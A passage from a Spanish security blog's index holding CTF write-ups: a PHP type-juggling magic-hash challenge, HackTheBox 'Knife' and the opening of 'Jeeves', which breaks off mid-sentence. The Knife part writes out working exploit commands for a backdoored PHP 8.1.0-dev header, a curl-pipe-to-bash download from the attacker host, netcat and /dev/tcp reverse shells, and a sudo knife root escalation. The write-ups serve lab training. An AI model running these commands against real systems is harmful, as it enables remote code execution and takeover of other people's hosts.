md5sum0e462097431906509019562988736854http://challenges. defsoc. tk:8080?hash=0e462097431906509019562988736854$value =  240610708 ;$hash_get =  0e462097431906509019562988736854 ; Exacto, no son iguales, ya que esta generando un hash nuevo con el valor 0e462097431906509019562988736854, as√≠ que tampoco es por ac√°‚Ä¶ Volviendo a la descripci√≥n del reto nos habla de -‚Äúalg√∫n tipo de juggling‚Äù- ¬økhe? Investiguemos. ‚Ä¶ Empezamos a jugar con el Type Juggling #‚Ä¶ Hablamos un poquito de Type Juggling üìå: Buscando juggling php llegamos a esta brutal descripci√≥n del propio manual de PHP: Perfecto, el primer p√°rrafo ya nos explica que es eso del ‚Äújuggling‚Äù (type juggling), b√°sicamente es el juego entre tipos de variables, donde podemos definir una que sea tipo int ($hola=1;) pero despu√©s darle otro valor que cambie su tipo, por ejemplo string ($hola= 1 ;) sin tener problemas. Esto es interesante, porque si validamos los dos resultados, ¬øser√≠an iguales? üòÆ Claramente no, ¬øcierto? Una es un entero y la otra es una string‚Ä¶ Validemos: &lt;?php  $holaINT = 1;  $holaSTRING =  1 ;  if ($holaINT == $holaSTRING) {    echo  Son iguales :o\n ;  }  else {    echo  No son iguales :)\n ;  }?&gt; WTF, ¬økheeeeeeeeeeee? (antes ya expliqu√© la raz√≥n, pero ¬øla recuerdas?). Apoyado en varios recursos vamos a entender que pasa ac√° y como aprovecharnos de ello‚Ä¶  PHP Type Juggling Vulnerabilities.  PHP Juggling type and magic hashes.  Hashes ‚Äúm√°gicos‚Äù en PHP (type jugling). Todo viene de la comparaci√≥n pobre que se hace al usar == o !=, que estar√≠a diciendo: ‚Äúv√°lida si las dos variables tienen el mismo valor‚Äù, pero esta comparaci√≥n no es estricta, por lo que no v√°lida si las dos tienen el mismo tipo de variable, en este caso si int == string, esto no lo hace, por eso nos muestra que son iguales üôÉ ‚Ä¶ Este comportamiento puede parecer a primera vista simplemente molesto, pero noooooooo, es causante de muuuuuuchos problemas y huecos en la seguridad‚Ä¶ El peligro puede llegar cuando aunque sea una de las variables que est√°n siendo comparadas, es manipulada por el usuario. Y que en el peor de los casos ese usuario tenga pensamientos de atacante üòà En nuestro caso tenemos un simple redirect hacia flag. php si logramos jugar correctamente con el Type Juggling, pero en el mundo real estos problemas se ven un mont√≥n en los panel login.  Ac√° un ejemplo de un c√≥digo vulnerable que maneja cookies. Bueno, ya vimos que 1== 1 , ¬øpero qu√© pasa si validamos 1== 1 y m√°s texto ac√° ? Claramente no son iguales‚Ä¶ &lt;?php  $holaINT = 1;  $holaSTRING =  1 y m√°s texto ac√° ;  if ($holaINT == $holaSTRING) {    echo  Son iguales :o\n ;  }  else {    echo  No son iguales :)\n ;  }?&gt;Ejecutamos: ‚ù± php test. php Son iguales :oJmmmmmmm, QUEEEEEEEEEEEEEE!! Lo que hace PHP ac√° es que como el primer car√°cter de la cadena es el n√∫mero de la otra variable (1), lo extrae y los dem√°s caracteres no le interesan, simplemente asimila que estamos comparando 1== 1 , o sea la misma prueba que hicimos antes‚Ä¶ Obviamente si cambiamos la cadena a algo como: 1== a y m√°s 1 texto ac√°  --&gt; No son iguales1== 2 y m√°s texto ac√°   --&gt; No son igualesPues perfecto, ya entendimos como funciona un Type Juggling, veamos como obtener la flag jugando con √©l. Explotamos el Type Juggling para conseguir la flag üìå: Algo que entendimos es que podemos generar el bypass simplemente consiguiendo que las dos variables sean del mismo tipo m√°s no con el mismo valor. El hash con el que esta comparando nuestro input ($_GET['hash']) es este: 0e462097431906509019562988736854Que si usamos PHP para ver su tipo, nos mostrara que es una string, peeeeeeeeeero si PHP encuentra que el hash empieza con 0e y el resto de su contenido es num√©rico, lo tratara como si su tipo de variable fuera float y no una string üò∂ ‚Ä¶ Con esto en mente, sabemos que tenemos que encontrar un valor que al obtener su hash MD5, primero empiece con 0e y segundo que su contenido sean solo n√∫meros‚Ä¶ As√≠, solo as√≠, har√≠amos que la validaci√≥n de: &lt;?php  $value =  240610708 ;  $hash_get =  &lt;este_valor&gt; ;  // md5($value) --&gt; 0e462097431906509019562988736854 --&gt; float  // md5($hash_get) --&gt; buscamos este valor numerico para que sea --&gt; float  // Y as√≠ compare (float==float) y logremos ver la flag  if ($key == $hash) {    echo  [+] Iguales. . . 3st4{es_l4_fLA6}\n ;  } ?&gt;Uff algo dif√≠cil, ¬øno? En internet encontramos much√≠simos valores con los que podr√≠amos probar:  Ac√° hay una graaaaaaaan lista de hashes MD5 flotantes. Si tomamos alguno, por ejemplo: NOOPCJF y lo probamos en nuestro test. php, generamos el bypass: Ya podr√≠amos probar en la web y tambi√©n obtendr√≠amos la flag, solo que ser√≠a la del reto. Pero ta feo simplemente copiar y pegar, intentemos buscar una cadena nosotros mismos‚Ä¶ ‚Ä¶ Jugamos con Python para encontrar hash tipo float #Eso s√≠, debemos tener paciencia, ya que tenemos que generar dos cosas importantes:  Un hash que inicie con 0e.  Que el contenido despu√©s del 0e sea √∫nicamente n√∫meros. Juguemos con cadenas random, as√≠ mismo ser√° la posibilidad de obtener r√°pido alg√∫n hash con los criterios necesarios‚Ä¶ #!/usr/bin/python3import hashlibimport stringimport randomimport signal# Funciones ---------------------------. def def_handler(signal, frame): # Controlamos salida con Ctrl+C  print()  exit()signal. signal(signal. SIGINT, def_handler)# Inicio del programa -----------------. dic = string. ascii_letters + string. digits # abc. . . xyzABC. . . XYZ0123456789rand_index = list(range(7, 15)) # Generamos array: [7, 8 . . . 13, 14]while True:  # Elegimos un numero aleatorio de nuestro array (entre 7 y 14), ese numero ser√° el tama√±o de la cadena.   # Y la cadena se construye con caracteres aleatorios del diccionario.   random_value = ''. join(random. choices(dic, k=random. choice(rand_index)))  # Generamos hash MD5 correspondiente al valor random.   hash_random_value = hashlib. md5(random_value. encode('utf-8')). hexdigest()  # Si el hash empieza con 0e, jugamos. . .   if hash_random_value. startswith( 0e ):    # Extraemos todo lo que esta despues del 0e y validamos si su contenido es numerico.     if hash_random_value[2:]. isnumeric():      # Si es numerico, tenemos el hash del texto que PHP interpreta como flotante.       print(f [+] Texto: {random_value} - Hash: {hash_random_value} )      break jugl. py Si lo ejecutamos (lo dicho, d√°ndole tiempo) llegamos a obtener una cadena: Y si hacemos las respectivas prueeeebaas: $value =  240610708 ;¬∑$hash_get =  TP4KzMGZ ; Opa, es v√°lidooooooooooo, si lo probamos ahora contra el sitio real: Y listoos, hemos bypasseado la validaci√≥n de hashes aprovechando la pobre comparaci√≥n que PHP hace al usar == y no ===. Esto para hacer un match en cuanto a los tipos de variables aunque el contenido de ellas sea distinto. ‚Ä¶ Referencias # Magic Hashes, whitehatsec.  PHP Type Juggling Vulnerabilities, medium/swlh.  PHP Juggling type and magic hashes, github/PayloadAllTheThings.  PDF - PHP Magic Tricks: Type Juggling, owasp.  Hashes ‚Äúm√°gicos‚Äù en PHP (type jugling), hackplayers. ‚Ä¶ Como dije al inicio, esta vulnerabilidad puede verse ‚Äúpeque√±a‚Äù en estos entornos de -ver flags-, pero las pobres comparaciones (== o !=) se ven mucho en logins, ah√≠ es donde reside el verdadero terror de esto, ya que podemos bypassear a lo loco. Espero que haya sido de utilidad este post y como siempre digo, a seguir rompiendo de todoooooooooooooo (pero con cuidadito y con respeto). "
    }, {
    "id": 20,
    "url": "http://localhost:4000/htb/knife",
    "title": "HackTheBox - Knife",
    "body": "2021/08/28 - M√°quina Linux nivel f√°cil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar c√≥digo Ruby como el usuario root (mediante sudo).  TL;DR (Spanish writeup): Creada por: MrKN16H. Las locuras de nuestra existencia e. e Hohoholaaa, en esta m√°quina nos encontraremos un servidor web con una versi√≥n PHP vulnerable a ejecuci√≥n remota de comandos, la usaremos para obtener una Reverse Shell como el usuario james. Enumerando los permisos que tenemos como otros usuarios (sudo), veremos que podemos ejecutar un binario llamado knife, buscando en internet formas de escalar privilegios usandolo, llegaremos a encontrar el subcomando exec, con √©l podremos ejecutar scripts o comandos Ruby, lo usaremos para establecer una Shell como el usuario root en el sistema. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Bastante juguetona, un poquito de movimientos con las manos (: y alguna que otra vuln conocida.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Moving fast‚Ä¶  Reconocimiento.      Escaneo de puertos mediante nmap.     Enumeraci√≥n.      Vemos que hay en el puerto 80.     Explotaci√≥n.      Jugamos con la vulnerabilidad de PHP para conseguir RCE.     Escalada de privilegios. ‚Ä¶ Reconocimiento #‚Ä¶ Escaneo de puertos con nmap üìå: Empezaremos haciendo un escaneo de puertos, esto nos permitir√° conocer que servicios esta corriendo el sistema, usaremos nmap: ‚ù± nmap -p- --open -v 10. 10. 10. 242 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   Obtenemos: ‚ù± cat initScan# Nmap 7. 80 scan initiated Sun Jun 20 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 242# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 242 ()	Status: UpHost: 10. 10. 10. 242 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Sun Jun 20 25:25:25 2021 -- 1 IP address (1 host up) scanned in 77. 55 seconds      Puerto   Descripci√≥n         22   SSH: Obtenci√≥n de una Shell de manera segura       80   HTTP: Servidor web   Ahora que tenemos los puertos, hagamos un escaneo m√°s reducido, en √©l buscaremos que versiones y scripts est√°n relacionados con cada servicio: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, que en este caso dar√≠a igual, ya que son 2 puertos no m√°s, pero esto es muy funcional cuando tenemos varios puertos, as√≠ no tendr√≠amos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 242  [*] Open ports: 22,80[*] Ports copied to clipboard)~ ‚ù± nmap -p 22,80 -sC -sV 10. 10. 10. 242 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Tendriamos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Sun Jun 20 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 242Nmap scan report for 10. 10. 10. 242Host is up (0. 11s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 2 (Ubuntu Linux; protocol 2. 0)80/tcp open http  Apache httpd 2. 4. 41 ((Ubuntu))|_http-server-header: Apache/2. 4. 41 (Ubuntu)|_http-title: Emergent Medical IdeaService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Sun Jun 20 25:25:25 2021 -- 1 IP address (1 host up) scanned in 11. 71 secondsCositas relevantes:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 2       80   HTTP   Apache/2. 4. 41   Pero por ahora poco m√°s, as√≠ que empecemos a explorar cada puerto y veamos por donde pinchar. ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: Encontramos una interfaz bastante simple, sin posibilidad de interactuar con ella ni movernos por ah√≠‚Ä¶ Buscando vulnerabilidades relacionadas con Apache 2. 4. 41 no encontramos nada √∫til. ‚Ä¶ Explotaci√≥n #Jugando con Wappalyzer (extensi√≥n web) vemos que el servidor web cuenta con el servicio PHP en su versi√≥n 8. 1. 0, buscando en internet vulnerabilidades sobre ella, encontramos una interesante:  PHP 8. 1. 0-dev Backdoor Remote Command Injection.  PHP 8. 1. 0-dev - ‚ÄòUser-Agentt‚Äô Remote Code Execution. Us√°ndola podremos conseguir ejecuci√≥n remota de comandos aprovech√°ndonos de la funci√≥n zend_eval_string() (que puede ejecutar peque√±os fragmentos de c√≥digo en el sistema) de PHP, el c√≥digo vulnerable es este: . . .  convert_to_string(enc); if (strstr(Z_STRVAL_P(enc),  zerodium )) {  zend_try {   zend_eval_string(Z_STRVAL_P(enc)+8, NULL,  REMOVETHIS: sold to zerodium, mid 2017 );. . . Donde pr√°cticamente lo que hace es:  Pasa (seg√∫n el nombre de la funci√≥n) lo que llegue (enc) a cadena de texto.  Si ese contenido (enc) a la primera encuentra (strstr) la cadena ‚Äúzerodium‚Äù en enc.  Entra a ejecutar (zend_eval_string) el contenido de enc.      As√≠ que simplemente deber√≠amos aprovechar que entre en esta funci√≥n e indicarle que nos ejecute algo (con ayuda de system() o exec() o shell_exec o lo que sea :P)   Esto tiene que hacerse con el header User-Agentt, donde su contenido sea el que contenga zerodium‚Ä¶, siguiendo los pocs vemos que su explotaci√≥n es muy sencilla, podemos jugar con curL y probar: Jugamos con la vulnerabilidad de PHP 8. 1. 0 üìå: Por ejemplo, si queremos ejecutar el comando whoami, har√≠amos: ‚ù± curl -s http://10. 10. 10. 242/ -H 'User-Agentt: zerodium;system( whoami );' | head -n 1jamesO para ver el id de (en este caso) james: ‚ù± curl -s http://10. 10. 10. 242/ -H 'User-Agentt: zerodium;system( id );' | head -n 1uid=1000(james) gid=1000(james) groups=1000(james)As√≠ que ya tenemos constancia que estamos ejecutando comandos en el sistema, pero ¬øsobre cu√°l? ‚ù± curl -s http://10. 10. 10. 242/ -H 'User-Agentt: zerodium;system( hostname );' | head -n 1knifeBien, al parecer estamos sobre el sistema base y no sobre alg√∫n contenedor, pues aprovechemos esto para obtener una Reverse Shell en el sistema‚Ä¶ Podr√≠amos colocar el comando dentro de la funci√≥n system(), pero para trabajar un poco m√°s organizados y no estar cambiando muchas cosas, vamos a crear un archivo . sh el cual contendr√° nuestro c√≥digo a ejecutar en el sistema yyy lo √∫nico que haremos sera decirle al sistema que venga a buscarlo (: Pero primero validemos si existe curL en la m√°quina: ‚ù± curl -s http://10. 10. 10. 242/ -H 'User-Agentt: zerodium;system( which curl );' | head -n 1/usr/bin/curlBien, entonces ahora si creemos el archivo . sh: ‚ù± cat rev. sh #!/bin/bashid | nc 10. 10. 14. 103 4433Inicialmente le diremos que nos env√≠e al puerto 4433 de nuestra m√°quina el resultado del comando id. (Esto nos sirve para comprobar si existe nc, si nos lee el archivo . sh y reafirmamos el RCE) Pong√°monos en escucha por el puerto 4433: ‚ù± nc -lvp 4433listening on [any] 4433 . . . Y levantemos nuestro servidor web, as√≠ jugando con curL lograremos que la m√°quina encuentre nuestro archivo . sh: ‚ù± python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Ahora s√≠, ejecutamos: ‚ù± curl -s http://10. 10. 10. 242/ -H 'User-Agentt: zerodium;system( /usr/bin/curl http://10. 10. 14. 103:8000/rev. sh );' | head#!/bin/bashid | nc 10. 10. 14. 103 4433&lt;!DOCTYPE html&gt;. . . Lo lee, solo nos queda indicarle que en vez de leer el script lo interprete, o sea, lo ejecute: ‚ù± curl -s http://10. 10. 10. 242/ -H 'User-Agentt: zerodium;system( /usr/bin/curl http://10. 10. 14. 103:8000/rev. sh | bash );' | headY en nuestro listener obtenemos: Perfessssssto, pues ahora si hagamos la Reverse Shell, lo √∫nico que debemos cambiar es nuestro archivo . sh y volvernos a poner en escucha: ‚ù± cat rev. sh #!/bin/bashnc 10. 10. 14. 103 4433 -e /bin/bashCon esto le indicamos que apenas establezca la conexi√≥n con el puerto 4433 de nuestra m√°quina nos lance una /bin/bash (una Shell)‚Ä¶ Pero ejecutando de nuevo no conseguimos nada. Lo m√°s probable es que la versi√≥n de nc que tenga el sistema sea la que no soporta el uso del par√°metro -e, as√≠ que modifiquemos el archivo . sh con otra opci√≥n: ‚ù± cat rev. sh #!/bin/bashbash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 14. 103/4433 0&gt;&amp;1'Pr√°cticamente le indicamos lo mismo, ‚Äúapenas obtengas la conexi√≥n con el puerto l√°nzame una bash‚Äù, ejecutamos nuestro curL yyyyy: ‚ù± curl -s http://10. 10. 10. 242/ -H 'User-Agentt: zerodium;system( /usr/bin/curl http://10. 10. 14. 103:8000/rev. sh | bash );' Bien, ahora tenemos una Shell como james en la m√°quina (: Tratamiento de la TTY: Antes de seguir hagamos nuestra terminal un poco m√°s amigable, permiti√©ndonos as√≠ ejecutar CTRL+C, tener hist√≥rico de comandos y movernos entre ellos: james@knife:/$ script /dev/null -c bash#Ejecutamos CTRL+Zjames@knife:/$ ^Z [1]+ Detenido        nc -lvp 4433Despu√©s escribimos: ‚ù± stty raw -echo; fgY aunque se vea corrido escribimos reset y despu√©s xterm:       resetreset: unknown terminal type unknownTerminal type? xtermY por ultimo: james@knife:/$ export TERM=xtermjames@knife:/$ export SHELL=bashNos apoyamos de otra ventana para obtener el tama√±o de las filas y columnas, ejecutamos stty -a, tomamos esos valores y escribimos ahora en la m√°quina: (Estos son los m√≠os) james@knife:/$ stty rows 43 columns 192Y listo, podemos movernos libremente por la consola sin temor a perderla en alg√∫n CTRL+C y adem√°s tenemos hist√≥rico :) ‚Ä¶ Escalada de privilegios #Viendo que permisos tenemos sobre otros usuarios (sudo encontramos que podemos ejecutar un binario como root: james@knife:~$ sudo -lMatching Defaults entries for james on knife:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser james may run the following commands on knife:  (root) NOPASSWD: /usr/bin/knifeValidando el binario, vemos varias cositas: james@knife:~$ ls -la /usr/bin/knifelrwxrwxrwx 1 root root 31 May 7 11:03 /usr/bin/knife -&gt; /opt/chef-workstation/bin/knifeEs un link simb√≥lico al binario /opt/chef-workstation/bin/knife, bien, r√°pidamente: üë©‚Äçüç≥ Chef es un sistema de automatizaci√≥n que facilita el despliegue de servidores y aplicaciones. üî™ Y Knife es una herramienta de terminal que interact√∫a con un servidor Chef‚Ä¶ Buscando cositas sobre ella y como aprovecharnos de su uso para escalar privilegios, encontramos: Knife tiene un subcomando llamado exec, el cual permite la ejecuci√≥n de scripts Ruby. Ech√°ndole un ojo a la wiki de knife_exec encontramos su uso:  Tenemos la opci√≥n -E que ejecuta c√≥digo directamente, pues intentemos jugar con ella‚Ä¶  How to run System Commands from Ruby. Es muy simple, si queremos ejecutar el comando id, lo har√≠amos as√≠: system( id )¬øSencillito, no? Pues hag√°moslo pero con knife exec: james@knife:/$ /usr/bin/knife exec -E 'system( id )'Ejecutamos para saber el id del usuario que esta ejecutando el proceso y obtenemos: james@knife:/$ /usr/bin/knife exec -E 'system( id )'WARNING: No knife configuration file found. See https://docs. chef. io/config_rb/ for details. uid=1000(james) gid=1000(james) groups=1000(james)Y si, nos ejecuta comandos en este caso como james, ya que no le hemos indicado que ejecute /usr/bin/knife con otros permisos o como otro usuario :P (sin sudo) Ahora hag√°moslo con los permisos del usuario root a ver si funciona (sudo solito le indica al sistema que queremos jugar con el usuario root, o tambi√©n podr√≠amos indic√°rselo usando -u root): james@knife:/$ sudo /usr/bin/knife exec -E 'system( id )' Opa la popa, estamos ejecutando comandos en el sistema como el usuario root üòÉ Pues ejecut√©monos una /bin/bash ah√≠ de rapidez: james@knife:/$ sudo /usr/bin/knife exec -E 'system( /bin/bash )' Listoneeeeeeeeeeeeeeeeeeees! Estamos dentro del sistema como el usuario root (: Vistaziemos las flags :o ey, emho telminao‚Äô ‚Ä¶ Linda m√°quina, me gusto que es real-life, un CVE y una aplicaci√≥n que por default tiene la opci√≥n de ejecutar comandos. Lo raro es que esta rateada super bajo y no me parecio que estuviera mal, como m√°quina para empezar esta muuuuuuuuuy bien. Bueno, por ahora no es m√°s que agradecimiento hacia la luna y el atardecer üò¨ Nos leeremos en otra ocasi√≥n yyyyyyyyyyy como siempre, a seguir rompiendo tooooooooodo!! "
    }, {
    "id": 21,
    "url": "http://localhost:4000/htb/jeeves",
    "title": "HackTheBox - Jeeves",
    "body": "2021/08/25 - M√°quina Windows nivel medio. La elegancia de Jenkins que nos permite jugar con scripts de Groovy para obtener RCE :O Archivos . kdbx con contrase√±as dentro (¬øqu√© puede pasar?) y descubriremos objetos ocultos mediante los Alternate Data Stream (ADS).  TL;DR (Spanish writeup): Creada por: mrb3n. Vamos a estar muy elegantes. Empezaremos con un servidor web algo pregunt√≥n, nos moveremos a otro m√°s calmadito con el que fuzzearemos directorios para encontrar recursos fuera de nuestra vista. Llegaremos a un servidor Jenkins bastaaaaante interesante. Usaremos su consola de scripts para ejecutar c√≥digo -interesante- del lenguaje de programaci√≥n Groovy. Finalmente obtendremos una Reverse Shell como el usuario kohsuke. Estando en el sistema encontraremos un archivo . kdbx (KeePass Database) que contiene tooooooodas las contrase√±as guardadas por kohsuke, pero para poder verlas necesitamos una contrase√±a -maestra-, jugaremos con keepass2john y john para crackear la credencial maestra, esto para obtener acceso completo a la base de datos con la herramienta kpcli. Una de las contrase√±as contiene un backup de unos hashes al dumpear la SAM, con ayuda de psexec lograremos probarlos contra el usuario Administrator y obtener una terminal en el sistema como el usuario nt authority\system. Y tendremos que hacer un peque√±o movimiento con los Alternate Data Stream para encontrar la flag root. txt oculta en un archivo. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Algunas vulns conocidas y cositas reales.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ En las noches fr√≠as.  Reconocimiento.      Enumeraci√≥n de puertos con nmap.     Enumeraci√≥n.      Recorremos el puerto 80.    Recorremos el puerto 50000.    Encontramos servidor Jenkins en el puerto 50000.     Explotaci√≥n.      Usamos instrucciones del lenguaje Groovy para ejecutar comandos en el sistema.    Intentamos desencriptar los secretos de Jenkins.     Escalada de privilegios.      Jugamos con el archivo KeePass y obtenemos master password de la base de datos.    Vemos credenciales del gestor KeePass.    Usamos psexec para obtener una terminal usando **hashes almacenados en la . kdbx.     Vemos que la flag esta oculta con un Alternate Data Stream. ‚Ä¶ Reconocimiento #‚Ä¶ Enumeraci√≥n de puertos con nmap üìå: Empezaremos viendo que puertos tiene abiertos la m√°quina, as√≠ vamos direccionando nuestro research, usaremos nmap: ‚ù± nmap -p- --open -v 10. 10. 10. 63 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   El escaneo nos devuelve: ‚ù± cat initScan# Nmap 7. 80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 63# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 63 ()	Status: UpHost: 10. 10. 10. 63 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///, 50000/open/tcp//ibm-db2///	Ignored State: filtered (65531)# Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 204. 57 seconds      Puerto   Descripci√≥n         80   HTTP: Nos ofrece un servidor web.        135/445   SMB: Protocolo para compartir informaci√≥n entre dispositivos de una red.        50000   ibm-db2: No sabemos a√∫n que esta sirviendo el puerto en concreto.    Bien, ahora que sabemos que puertos hay, vamos a profundizar un poco m√°s y descubrir que scripts y versiones est√°n siendo mantenid@s por cada servicio: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 63  [*] Open ports: 80,135,445,50000[*] Ports copied to clipboard)~ ‚ù± nmap -p 80,135,445,50000 -sC -sV 10. 10. 10. 63 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Y este escaneo nos muestra: ‚ù± cat portScan# Nmap 7. 80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p 80,135,445,50000 -sC -sV -oN portScan 10. 10. 10. 63Nmap scan report for 10. 10. 10. 63Host is up (0. 11s latency). PORT   STATE SERVICE   VERSION80/tcp  open http     Microsoft IIS httpd 10. 0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10. 0|_http-title: Ask Jeeves135/tcp  open msrpc    Microsoft Windows RPC445/tcp  open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)50000/tcp open http     Jetty 9. 4. z-SNAPSHOT|_http-server-header: Jetty(9. 4. z-SNAPSHOT)|_http-title: Error 404 Not FoundService Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 5h05m37s, deviation: 0s, median: 5h05m36s|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)| smb-security-mode: |  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: |  2. 02: |_  Message signing enabled but not required| smb2-time: |  date: 2021-08-17T21:40:02|_ start_date: 2021-08-17T21:30:10Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 48. 15 secondsCositas relevantes:       Puerto   Servicio   Versi√≥n         80   HTTP   ¬†    Vemos Ask Jeeves, es curioso, pero no tenemos a√∫n certeza de que es.       Puerto   Servicio   Versi√≥n       50000   HTTP   Jetty 9. 4. z-SNAPSHOT   Esa versi√≥n suena locochona, teng√°mosla en cuenta para m√°s adelante, por ahora no vemos nada m√°s, sigamos. ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: Lindo, encontramos el logo del famoso Ask (que su nombre original es Ask Jeeves), encargado de hacer b√∫squedas en internet (es como un Google), as√≠ que contamos con un motor de b√∫squeda como primera medida. Existe un campo en el que podemos escribir cositas para ser buscadas, pero con cualquier t√©rmino nos redirige al recurso error. html: Y ese recurso tiene esta imagen:  De ella podemos destacar varias cositas:  Microsoft SQL Server 2005 - 9. 00. 4053.  Una ruta de los archivos de la web: c:\webroot\Sock_Puppets\. . . .  Y al final unas versiones, tanto de . NET como de ASP. NET. No sabemos si esto nos sirva de algo (por la fecha que tiene el error) pero podemos guardarlo (: Puerto 50000 üìå: Revisando el servicio del puerto 50000 encontramos esto: Volvemos a ver la referencia hacia Jetty 9. 4. z-SNAPSHOT, as√≠ que busquemos de que trata‚Ä¶ üöèüöèüöè Jetty es un servidor web y contenedor de Servlets (clases que ayudan a ampliar las capacidades de un servidor) que se enfoca 100% en Java. Bien, buscando vulnerabilidades relacionadas con la versi√≥n 9. 4. z-SNAPSHOT o 9. 4 caemos en este post:  Critical Jenkins Server Vulnerability - (CVE-2019-17638). üöÄ ‚ÄúJenkins, the open-source automation server software, had a critical vulnerability (CVE-2019-17638) in the Jetty web server that allowed the leakage of users confidential data. ‚Äù davosnetworks. OJOOOOooklajsdl√±f ¬øqu√© es Jenkins? ¬ø? ¬ø? r√°pidamenteeeeeee‚Ä¶ La idea de Jenkins es supervisar tooooooodas las tareas repetitivas que se realizan en un proyecto, peeeeeero lo hace √©l, eso evita a los programadores estar revisando y revisando problemas o temas relacionados con el c√≥digo. Su definici√≥n es sencilla: servidor automatizado de integraci√≥n continua. Les dejo este excelente post donde se habla de que es Jenkins y la integraci√≥n continua:  ¬øQu√© es Jenkins?, Herramienta de Integraci√≥n Continua. Bien, peeeeeeeeeeeeeeero no podemos hacer nada con esa vulnerabilidad que encontramos, ya que tenemos el servidor Jetty pero no el servidor Jenkins. ‚Ä¶ Encontramos servidor Jenkins en el puerto 50000 üìå: Despu√©s de estar probando cositas, encontramos algo llamativo al fuzzear directorios que la web sostiene, pero fuera de nuestra vista. Usaremos wfuzz pas√°ndole 20 hilos, el wordlist que usara y en que parte la URL queremos que pruebe cada l√≠nea: ‚ù± wfuzz -c --hc=404 -t 20 -w /opt/SecLists/Discovery/Web-Content/directory-list-2. 3-medium. txt http://10. 10. 10. 63:50000/FUZZ. . . =====================================================================ID      Response  Lines  Word    Chars    Payload                                                            =====================================================================000041607:  302    0 L   0 W    0 Ch     askjeeves . . . S√∫per leeeeeeejos (el archivo tiene m√°s de 200k l√≠neas) encontr√≥ un recurso llamado askjeeves (que se relaciona con nuestro servicio en el puerto 80), es un redirect, pero ve√°moslo a ver a donde nos lleva: Pos si, tamos en la interfaz del servidor Jenkins, lo primero llamativo a la vista fue la versi√≥n que esta abajo a la derecha: Jenkins 2. 87, esto nos abre una nueva puerta para buscar vulns. ‚Ä¶ Explotaci√≥n #Indagando un poco en las opciones que nos brinda el servidor, vemos en la parte izquierda una tuerca y el texto Manage Jenkins, si damos clic recibimos:  Hay varios apartados interesantes, pero de toooooooooodos hay dos muuuuy llamativos: System Information (info del entorno donde esta montado Jenkins) y Script Console (permite ejecutar scripts). üöÜ System Information: Uff bastantes cositas‚Ä¶ Pero lo m√°s relevante ser√≠a esto: Tenemos dos usuarios del sistema y vemos la ruta donde esta el ejecutable de 